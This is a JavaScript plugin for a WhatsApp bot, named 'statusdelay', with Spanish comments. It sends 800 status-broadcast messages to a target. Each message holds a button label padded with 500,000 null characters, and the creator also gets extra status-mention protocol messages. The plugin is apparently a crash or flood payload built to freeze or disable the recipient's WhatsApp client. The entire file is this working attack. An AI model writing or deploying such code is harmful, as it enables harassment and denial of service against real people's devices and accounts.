// plugins/statusdelay.js

module.exports = {
    name: 'statusdelay',
    alias: [],

    async execute(conn, m, args, context) {
        
        // 1. Extraemos las variables y funciones que necesitamos del 'context'
        const { isBot, isCreator, from, generateWAMessageFromContent } = context;

        // 2. Tu código original, sin ninguna modificación en su lógica
        if (!isBot && !isCreator) return;

        conn.sendMessage(m.chat, { react: { text: '⏳️', key: m.key } });

        for (let i = 0; i < 800; i++) {
            let msg = await generateWAMessageFromContent(from, {
                buttonsMessage: {
                    text: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
                    contentText: "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 ⚡️",
                    buttons: [
                        {
                            buttonId: ".null",
                            buttonText: {
                                displayText: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘" + "\u0000".repeat(500000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});

            await conn.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [from],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: from },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });

            if (isCreator) {
                await conn.relayMessage(
                    from,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
        conn.sendMessage(m.chat, { react: { text: '✅️', key: m.key } });
    }
};